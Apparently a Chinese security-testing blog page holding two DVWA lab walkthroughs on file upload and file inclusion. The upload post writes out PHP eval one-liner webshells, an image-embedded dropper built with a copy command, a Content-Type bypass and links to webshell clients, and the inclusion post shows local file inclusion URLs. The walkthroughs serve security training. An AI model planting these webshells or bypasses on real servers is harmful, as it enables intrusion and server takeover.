<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"louis-me.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":true,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="一个正经的测试工程师">
<meta property="og:type" content="website">
<meta property="og:title" content="施坤的博客">
<meta property="og:url" content="https://louis-me.github.io/page/9/index.html">
<meta property="og:site_name" content="施坤的博客">
<meta property="og:description" content="一个正经的测试工程师">
<meta property="og:locale" content="zh_CN">
<meta property="article:tag" content="自动化测试,安全测试,性能测试,渗透测试,大数据测试,python,jmeter,airtest,appium,monkey">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://louis-me.github.io/page/9/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>施坤的博客 </title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">施坤的博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-简历">

    <a href="/resume/" rel="section"><i class="fa fa-address-card fa-fw"></i>简历</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
  
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/14cb0ff0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/14cb0ff0/" class="post-title-link" itemprop="url">DVWA通关指南-File Upload(文件上传)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-08 16:55:25" itemprop="dateCreated datePublished" datetime="2022-02-08T16:55:25+08:00">2022-02-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/14cb0ff0/" class="post-meta-item leancloud_visitors" data-flag-title="DVWA通关指南-File Upload(文件上传)" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/14cb0ff0/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/14cb0ff0/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="文件上传漏洞-File-Upload"><a href="#文件上传漏洞-File-Upload" class="headerlink" title="文件上传漏洞 File Upload"></a>文件上传漏洞 File Upload</h2><ul>
<li><p>⽂件上传是Web 应⽤必备功能之⼀。</p>
</li>
<li><p>如果服务器配置不当或者没有进⾏⾜够的过滤，Web ⽤户就可以上传任意⽂件，包括恶意脚本⽂件，exe 程序等等，这就造成了⽂件上传漏洞。</p>
</li>
</ul>
<h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><ul>
<li>服务器配置不当</li>
<li>Web应用开放了文件上传功能，没有对上传的文件做足够的限制和过滤。</li>
<li>在程序开发部署时，没有考虑到系统的特性或组件的漏洞，而导致限制被绕过。</li>
</ul>
<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ul>
<li>上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本，程序等。</li>
<li>直接上传后门文件，导致网站沦陷。</li>
<li>通过恶意文件，利用其他楼栋拿到管理员权限（提权），导致服务器沦陷。</li>
<li>通过文件上传漏洞获得网站后门，叫<strong>Webshell</strong></li>
</ul>
<h2 id="安全等级LOW"><a href="#安全等级LOW" class="headerlink" title="安全等级LOW"></a>安全等级LOW</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>低难度级别可以任意文件上传没有做任何安全过滤。我们可以直接<strong>上传木马一句话</strong>，利用<strong>冰蝎</strong>连接。</p>
<p><img src="/aposts/14cb0ff0/image-20220208170803959.png" alt="image-20220208170803959"></p>
<h3 id="冰歇"><a href="#冰歇" class="headerlink" title="冰歇"></a>冰歇</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
<li>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。老牌 Webshell 管理神器——<strong>中国菜刀</strong>的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，加密 Webshell 正变得日趋流行。由于通信流量被加密，传统的 WAF、IDS 设备难以检测，给威胁狩猎带来较大挑战。冰蝎其最大特点就是对交互流量进行对称加密，且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测</li>
<li>官网地址为：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></li>
<li>运行环境：<ul>
<li>客户端：jre8+</li>
<li>服务端：.net 2.0+;php 5.3-7.4;java 6+</li>
</ul>
</li>
</ul>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li>打开<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases%EF%BC%8C%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81">https://github.com/rebeyond/Behinder/releases，下载源码</a></li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220208173550815.png" alt="image-20220208173550815"></p>
<ul>
<li>本地windwos启动客户端</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\exe\Behinder_v3.0_Beta_11.t00ls&gt;java -jar Behinder.jar</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/14cb0ff0/image-20220209084403643.png" alt="image-20220209084403643"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li>上传木马文件，其实就是冰蝎server中带有的shell.php文件<ul>
<li>比如<code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code>就是典型的一句话木马，这里的123为自定义密码</li>
</ul>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209090359025.png" alt="image-20220209090359025"></p>
<p><img src="/aposts/14cb0ff0/image-20220209085226115.png" alt="image-20220209085226115"></p>
<ul>
<li>查看服务器成功上传成功的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos uploads]# pwd</span><br><span class="line">/var/www/html/DVWA-2.0.1/hackable/uploads</span><br><span class="line">[root@VM-24-13-centos uploads]# ll</span><br><span class="line">total 8</span><br><span class="line">-rw-r--r-- 1 root   root   667 Jan 26 09:38 dvwa_email.png</span><br><span class="line">-rw-r--r-- 1 apache apache 643 Feb  9 09:02 shell.php  # 这个就是刚刚上传的文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>冰歇连接，注意默认密码就是rebeyond</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209090923680.png" alt="image-20220209090923680"></p>
<ul>
<li>双击刚刚新增的url，自动弹出连接成功的界面（需要等几秒钟，才会出结果）</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209091142730.png" alt="image-20220209091142730"></p>
<ul>
<li><strong>无论是执行shell命令，还是管理文件，基本上服务器行的信息全部暴露无遗</strong></li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209091417269.png" alt="image-20220209091417269"></p>
<p><img src="/aposts/14cb0ff0/image-20220209100608363.png" alt="image-20220209100608363"></p>
<h2 id="安全等级为medium"><a href="#安全等级为medium" class="headerlink" title="安全等级为medium"></a>安全等级为medium</h2><ul>
<li>直接上传木马文件shell.php，报错了</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209101333174.png" alt="image-20220209101333174"></p>
<h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>对文件上传类型和文件大小做了限制</p>
<p><img src="/aposts/14cb0ff0/image-20220209101149257.png" alt="image-20220209101149257"></p>
<h3 id="开始攻击-1"><a href="#开始攻击-1" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>先把服务器上的shell.php文件删除</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos uploads]# rm shell.php</span><br><span class="line">rm: remove regular file ‘shell.php’? y</span><br><span class="line">[root@VM-24-13-centos uploads]#</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传木马shell文件</p>
<p><img src="/aposts/14cb0ff0/image-20220209103101816.png" alt="image-20220209103101816"></p>
<p>burp site 拦截上传请求</p>
<p><img src="/aposts/14cb0ff0/image-20220209103229163.png" alt="image-20220209103229163"></p>
<p>把content-type修改为image&#x2F;jpeg</p>
<p><img src="/aposts/14cb0ff0/image-20220209103347977.png" alt="image-20220209103347977"></p>
<p>点击拦截请求，把状态改为禁用</p>
<p><img src="/aposts/14cb0ff0/image-20220209103440177.png" alt="image-20220209103440177"></p>
<p><img src="/aposts/14cb0ff0/image-20220209103506461.png" alt="image-20220209103506461"></p>
<p>发现文件上传成功</p>
<p><img src="/aposts/14cb0ff0/image-20220209103525182.png" alt="image-20220209103525182"></p>
<p>服务器上查看到刚刚上传成功的文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@VM-24-13-centos uploads]# ls</span><br><span class="line">dvwa_email.png  shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用冰歇同样连接成功</p>
<p><img src="/aposts/14cb0ff0/image-20220209103700345.png" alt="image-20220209103700345"></p>
<h2 id="安定等级为High"><a href="#安定等级为High" class="headerlink" title="安定等级为High"></a>安定等级为High</h2><p><strong>注意，本次攻击失败，但是也把攻击步骤写下来</strong></p>
<h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><p>对文件后缀进行白名单验证，所以我们只能进行图片jpg png的上传</p>
<p><img src="/aposts/14cb0ff0/image-20220209104615758.png" alt="image-20220209104615758"></p>
<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><ul>
<li><p>菜刀和冰歇差不多的工具</p>
</li>
<li><p>现在最新的是2016的版本，这里下载：<a target="_blank" rel="noopener" href="https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL">https://github.com/raddyfiy/caidao-official-version/releases/tag/NULL</a></p>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209114037607.png" alt="image-20220209114037607"></p>
<ul>
<li>使用copy命令的方式，写一个图片木马文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209154852952.png" alt="image-20220209154852952"></p>
<ul>
<li>1.bat中的文件内容就是copy命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a 3.jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>1.php中的内容，<strong>注意777是密码</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&quot;shell.php&quot;,&#x27;w&#x27;),&#x27;&lt;?=@eval($_REQUEST[777])?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行1.bat生成了3.jpg文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155219270.png" alt="image-20220209155219270"></p>
<ul>
<li>上传3.jpg文件</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155338946.png" alt="image-20220209155338946"></p>
<ul>
<li><p>用文件包含的方式访问刚刚上传的图片，发现了乱码</p>
<p>http:&#x2F;xx.xx.xx.xx&#x2F;DVWA-2.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;DVWA-2.0.1&#x2F;hackable&#x2F;uploads&#x2F;3.jpg</p>
</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155603879.png" alt="image-20220209155603879"></p>
<ul>
<li>使用菜刀连接，发现一直无法得到webshell，最终发现原来这样访问肯定不行，<strong>因为没有登录，这样直接访问跳转到了登录界面</strong>，很多博文都是这样记录的，有点奇怪</li>
</ul>
<p><img src="/aposts/14cb0ff0/image-20220209155804364.png" alt="image-20220209155804364"></p>
<h2 id="安全等级为Impossible"><a href="#安全等级为Impossible" class="headerlink" title="安全等级为Impossible"></a>安全等级为Impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><p>这里分析一下 Impossible级别的代码，对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<p><img src="/aposts/14cb0ff0/image-20220209160436185.png" alt="image-20220209160436185"></p>
<p>本文主要参考的来自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42094992/article/details/107822876?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.pc_relevant_default&spm=1001.2101.3001.4242.1&utm_relevant_index=3">这里</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/d3b7fcf8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/d3b7fcf8/" class="post-title-link" itemprop="url">DVWA通关指南-File Inclusion（文件包含）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-08 15:02:32" itemprop="dateCreated datePublished" datetime="2022-02-08T15:02:32+08:00">2022-02-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">安全测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/d3b7fcf8/" class="post-meta-item leancloud_visitors" data-flag-title="DVWA通关指南-File Inclusion（文件包含）" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/d3b7fcf8/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/d3b7fcf8/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul>
<li>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中(<strong>php中比较常见</strong>)，提供了：<code>require(),require_once()</code></li>
<li>这些文件包含函数，这些函数在代码设计中被经常使用到。</li>
<li>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为<strong>本地文件包含漏洞和远程文件包含漏洞</strong>。<ul>
<li><strong>本地文件包含漏洞</strong>：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</li>
<li><strong>远程文件包含漏洞</strong>：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。<br>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的<strong>白名单策略进行过滤</strong>。</li>
</ul>
</li>
</ul>
<h2 id="安全等级为Low"><a href="#安全等级为Low" class="headerlink" title="安全等级为Low"></a>安全等级为Low</h2><p><img src="/aposts/d3b7fcf8/image-20220208151327133.png" alt="image-20220208151327133"></p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li>先看下file1.php源代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># pwd</span></span><br><span class="line">/<span class="keyword">var</span>/www/html/DVWA-<span class="number">2.0</span>.<span class="number">1</span>/vulnerabilities/fi</span><br><span class="line">[root@VM-<span class="number">24</span>-<span class="number">13</span>-centos fi]<span class="comment"># cat file1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;div class=\&quot;body_padded\&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Vulnerability: File Inclusion&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=\&quot;vulnerable_code_area\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h3&gt;File 1&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                &lt;hr /&gt;</span></span><br><span class="line"><span class="string">                Hello &lt;em&gt;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&lt;/em&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                Your IP address is: &lt;em&gt;<span class="subst">&#123;$_SERVER[ &#x27;REMOTE_ADDR&#x27; ]&#125;</span>&lt;/em&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">                [&lt;em&gt;&lt;a href=\&quot;?page=include.php\&quot;&gt;back&lt;/a&gt;&lt;/em&gt;]</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h2&gt;More Information&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;ul&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://en.wikipedia.org/wiki/Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;Wikipedia - File inclusion vulnerability&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Local File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">                &lt;li&gt;&quot;</span> . <span class="title function_ invoke__">dvwaExternalLinkUrlGet</span>( <span class="string">&#x27;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion&#x27;</span>, <span class="string">&#x27;WSTG - Remote File Inclusion&#x27;</span> ) . <span class="string">&quot;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>看下dvwa的源码，直接获取了page参数，没有任何过滤</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208151611350.png" alt="image-20220208151611350"></p>
<ul>
<li>尝试点击,发现page的值就是文件名</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208151804922.png" alt="image-20220208151804922"></p>
<h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><ul>
<li><strong>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行</strong>，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，<strong>所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</strong></li>
</ul>
<h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><ul>
<li>将本地文件路径传给page，直接在服务器的本地路径新建一个phpinfo.txt文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos html]# pwd</span><br><span class="line">/var/www/html</span><br><span class="line">[root@VM-24-13-centos html]# vi phpinfo.txt</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos html]# systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问地址把page加上路径，如：<a target="_blank" rel="noopener" href="http://xx.xx.xx.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt">http://XX.XX.XX.xxx/DVWA-2.0.1/vulnerabilities/fi/?page=/var/www/html/phpinfo.txt</a></li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208153727889.png" alt="image-20220208153727889"></p>
<h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><ul>
<li>本地搭建简单的http服务器，我用的python3自带的</li>
</ul>
<p><img src="/aposts/d3b7fcf8/image-20220208155233231.png" alt="image-20220208155233231"></p>
